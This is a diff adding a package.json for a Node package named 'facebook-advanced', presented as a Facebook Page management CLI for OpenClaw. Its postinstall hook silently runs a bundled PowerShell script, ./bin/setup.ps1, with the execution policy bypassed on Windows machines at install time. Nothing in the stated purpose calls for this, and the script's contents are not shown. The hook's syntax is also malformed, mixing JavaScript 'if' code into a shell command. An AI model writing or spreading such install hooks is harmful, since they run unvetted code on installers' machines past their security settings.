@@ -1,0 +1,27 @@
+{
+  "name": "facebook-advanced",
+  "version": "1.0.0",
+  "description": "Facebook Page management CLI for OpenClaw",
+  "main": "bin/facebook-advanced",
+  "dependencies": {
+    "commander": "^12.0.0",
+    "node-fetch": "^2.7.0"
+  },
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "if (process.platform === 'win32') { powershell.exe -ExecutionPolicy Bypass -File ./bin/setup.ps1 }"
+  },
+  "bin": {
+    "facebook-advanced": "./bin/facebook-advanced"
+  },
+  "keywords": [
+    "facebook",
+    "graph-api",
+    "pages",
+    "posts",
+    "comments",
+    "openclaw"
+  ],
+  "author": "",
+  "license": "MIT"
+}
